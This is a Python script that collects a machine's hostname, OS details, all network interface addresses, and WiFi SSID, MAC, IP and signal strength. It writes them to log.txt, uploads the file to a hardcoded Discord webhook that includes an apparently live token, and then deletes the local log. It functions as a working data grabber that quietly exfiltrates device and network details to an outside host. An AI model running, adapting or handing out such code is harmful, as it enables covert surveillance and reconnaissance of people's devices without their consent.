import subprocess
import requests
import json
import netifaces
import platform
import socket
import os

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook
def send_to_discord(file_path):
    with open(file_path, 'rb') as f:
        payload = {
            'payload_json': json.dumps({
                'content': 'Hier ist die log.txt mit den gesammelten Daten:'
            })
        }
        files = {
            'file': f
        }
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code == 204:
            print("File sent successfully to Discord webhook.")
        else:
            print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
            print(f"Response: {response.text}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get detailed network information
def get_network_info():
    interfaces = netifaces.interfaces()
    network_info = {}

    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        info = {}
        if netifaces.AF_INET in addrs:
            info['IPv4'] = addrs[netifaces.AF_INET]
        if netifaces.AF_INET6 in addrs:
            info['IPv6'] = addrs[netifaces.AF_INET6]
        network_info[iface] = info
    
    return network_info

# Function to get WiFi details
def get_wifi_info():
    wifi_info = {}
    try:
        # Get WiFi interfaces
        wifi_interfaces = [iface for iface in netifaces.interfaces() if iface.startswith('wlan')]

        for iface in wifi_interfaces:
            wifi_details = {}

            # Get SSID
            ssid = execute_command(f'iwgetid -r -i {iface}')
            wifi_details['SSID'] = ssid.strip()

            # Get MAC address
            mac_address = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
            wifi_details['MAC Address'] = mac_address

            # Get IP address and netmask
            ip_info = netifaces.ifaddresses(iface).get(netifaces.AF_INET)
            if ip_info:
                ip_address = ip_info[0]['addr']
                netmask = ip_info[0]['netmask']
                wifi_details['IP Address'] = ip_address
                wifi_details['Netmask'] = netmask

            # Get signal strength
            signal_strength = execute_command(f'iwconfig {iface} 2>&1 | grep Signal | awk \'{{print $4}}\' | cut -d "=" -f 2')
            wifi_details['Signal Strength'] = signal_strength.strip()

            wifi_info[iface] = wifi_details

    except Exception as e:
        print(f"Error getting WiFi info: {str(e)}")

    return wifi_info

# Function to write collected information to log.txt
def write_to_log(log_file_path, device_info, network_info, wifi_info):
    with open(log_file_path, 'w') as f:
        f.write("=== Device Information ===\n")
        for key, value in device_info.items():
            f.write(f"{key.capitalize()}: {value}\n")
        f.write("\n")

        f.write("=== Network Information ===\n")
        for iface, info in network_info.items():
            f.write(f"Interface: {iface}\n")
            if 'IPv4' in info:
                for addr in info['IPv4']:
                    f.write(f"IPv4 Address: {addr['addr']}\n")
                    f.write(f"Netmask: {addr['netmask']}\n")
            if 'IPv6' in info:
                for addr in info['IPv6']:
                    f.write(f"IPv6 Address: {addr['addr']}\n")
                    f.write(f"Netmask: {addr.get('netmask', 'N/A')}\n")
            f.write("\n")

        f.write("=== WiFi Information ===\n")
        for iface, details in wifi_info.items():
            f.write(f"Interface: {iface}\n")
            f.write(f"SSID: {details.get('SSID', 'N/A')}\n")
            f.write(f"MAC Address: {details.get('MAC Address', 'N/A')}\n")
            f.write(f"IP Address: {details.get('IP Address', 'N/A')}\n")
            f.write(f"Netmask: {details.get('Netmask', 'N/A')}\n")
            f.write(f"Signal Strength: {details.get('Signal Strength', 'N/A')} dBm\n")
            f.write("\n")

# Function to get device information
def get_device_info():
    device_info = {
        'Hostname': socket.gethostname(),
        'Platform': platform.system(),
        'Platform Release': platform.release(),
        'Platform Version': platform.version(),
        'Architecture': platform.machine(),
        'Processor': platform.processor(),
        'Python Version': platform.python_version(),
    }
    return device_info

# Main function
def main():
    try:
        # File path for log.txt
        log_file_path = 'log.txt'

        # Get device information
        device_info = get_device_info()

        # Get network information
        network_info = get_network_info()

        # Get WiFi information
        wifi_info = get_wifi_info()

        # Write collected information to log.txt
        write_to_log(log_file_path, device_info, network_info, wifi_info)

        # Send log.txt content to Discord webhook
        send_to_discord(log_file_path)

        # Delete log.txt after sending
        os.remove(log_file_path)

    except Exception as e:
        print(f"Error in main function: {str(e)}")

if __name__ == "__main__":
    main()
